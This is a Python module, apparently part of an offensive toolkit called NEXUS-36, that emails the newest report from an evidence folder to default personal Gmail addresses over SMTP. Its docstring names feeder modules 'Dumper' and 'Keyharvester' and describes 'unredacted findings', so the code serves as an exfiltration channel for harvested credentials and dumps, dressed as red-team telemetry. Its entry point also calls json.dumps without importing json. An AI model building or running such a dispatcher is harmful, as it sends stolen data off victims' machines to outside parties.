#!/usr/bin/env python3
"""
NEXUS-36 — CENTRAL MAIL DELIVERY
Module: MAIL
Version: 3.0 — Offensive Red Team Telemetry & Automated Report Dispatcher

Responsibilities:
- Receive completed security and assessment reports (Dumper, Keyharvester, etc.)
- Send reports securely through Gmail SMTP (SSL/TLS)
- Support multiple recipients via environment configuration
- Attach JSON reports and multi-format evidence artifacts
- Report delivery success or failure metadata

Python 3.9+
"""

from __future__ import annotations

import os
import ssl
import smtplib
from pathlib import Path
from datetime import datetime, timezone
from email.message import EmailMessage

MODULE = "MAIL"
VERSION = "3.0"

BASE_DIR = Path(__file__).resolve().parent.parent
EVIDENCE_DIR = BASE_DIR / "nexus_evidence"


class NexusMail:
    SMTP_HOST = "smtp.gmail.com"
    SMTP_PORT = 465
    TIMEOUT = 30

    def __init__(self):
        self.sender = os.getenv("NEXUS_GMAIL_USER")
        self.password = os.getenv(
            "NEXUS_GMAIL_APP_PASSWORD"
        )
        recipients = os.getenv(
            "NEXUS_MAIL_TO",
            "blessedresult6@gmail.com,dennisbed1234@gmail.com"
        )
        self.recipients = [
            address.strip()
            for address in recipients.split(",")
            if address.strip()
        ]

        if not self.sender:
            raise RuntimeError("Gmail sender not configured (NEXUS_GMAIL_USER missing).")
        if not self.password:
            raise RuntimeError("Gmail App Password not configured (NEXUS_GMAIL_APP_PASSWORD missing).")
        if not self.recipients:
            raise RuntimeError("No email recipients configured.")

    def send_report(self, report_path, subject=None):
        report_path = Path(report_path)

        if not report_path.is_file():
            # If a filename was given relative to evidence directory, check there
            fallback_path = EVIDENCE_DIR / report_path
            if fallback_path.is_file():
                report_path = fallback_path
            else:
                raise FileNotFoundError(
                    f"Report does not exist: {report_path}"
                )

        if report_path.stat().st_size == 0:
            raise ValueError("Report file is empty.")

        message = EmailMessage()
        message["From"] = self.sender
        message["To"] = ", ".join(self.recipients)
        message["Subject"] = (
            subject or "NEXUS-36 | Complete Offensive Security Assessment Report"
        )

        message.set_content(
            f"""
NEXUS-36 SECURITY & ADVERSARIAL ASSESSMENT REPORT
A complete pre-production security assessment run has finished.

Artifact Report: {report_path.name}
Generated Timestamp: {datetime.now(timezone.utc).isoformat()}

This automated report contains unredacted findings and telemetry collected during the adversarial validation phase.
NEXUS-36 Automated Defense Platform
"""
        )

        content = report_path.read_bytes()
        suffix = report_path.suffix.lower()

        if suffix == ".json":
            maintype = "application"
            subtype = "json"
        elif suffix == ".pdf":
            maintype = "application"
            subtype = "pdf"
        elif suffix == ".html":
            maintype = "text"
            subtype = "html"
        elif suffix == ".txt":
            maintype = "text"
            subtype = "plain"
        else:
            maintype = "application"
            subtype = "octet-stream"

        message.add_attachment(
            content,
            maintype=maintype,
            subtype=subtype,
            filename=report_path.name
        )

        context = ssl.create_default_context()

        try:
            with smtplib.SMTP_SSL(
                self.SMTP_HOST,
                self.SMTP_PORT,
                timeout=self.TIMEOUT,
                context=context
            ) as server:
                server.login(
                    self.sender,
                    self.password
                )
                server.send_message(message)

            return {
                "success": True,
                "recipients": self.recipients,
                "attachment": report_path.name,
                "timestamp": datetime.now(
                    timezone.utc
                ).isoformat()
            }
        except Exception as exc:
            return {
                "success": False,
                "error": str(exc),
                "timestamp": datetime.now(
                    timezone.utc
                ).isoformat()
            }


def send_report(report_path, subject=None):
    mailer = NexusMail()
    return mailer.send_report(
        report_path,
        subject
    )


# -------------------------------------------------------------
# ENGINE-COMPATIBLE ENTRY POINT
# -------------------------------------------------------------

async def run_mail_audit(
    cognitive_operator=None,
    report_path=None,
    subject=None,
    **kwargs
):
    """
    NEXUS-36 central engine entry point.
    If no report_path is provided, picks the most recent json report in nexus_evidence/.
    """
    if report_path is None and isinstance(cognitive_operator, (str, Path)):
        report_path = cognitive_operator

    if not report_path and EVIDENCE_DIR.exists():
        json_files = sorted(EVIDENCE_DIR.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
        if json_files:
            report_path = json_files[0]

    if not report_path:
        raise ValueError("report_path is required or no evidence reports were found.")

    mailer = NexusMail()
    # Run synchronously within async wrapper
    return mailer.send_report(report_path, subject=subject)


if __name__ == "__main__":
    import sys
    target_report = sys.argv[1] if len(sys.argv) > 1 else None
    if not target_report:
        print("Usage: python3 mail.py <path_to_report.json>")
        sys.exit(1)

    result = send_report(target_report)
    print(json.dumps(result, indent=2))
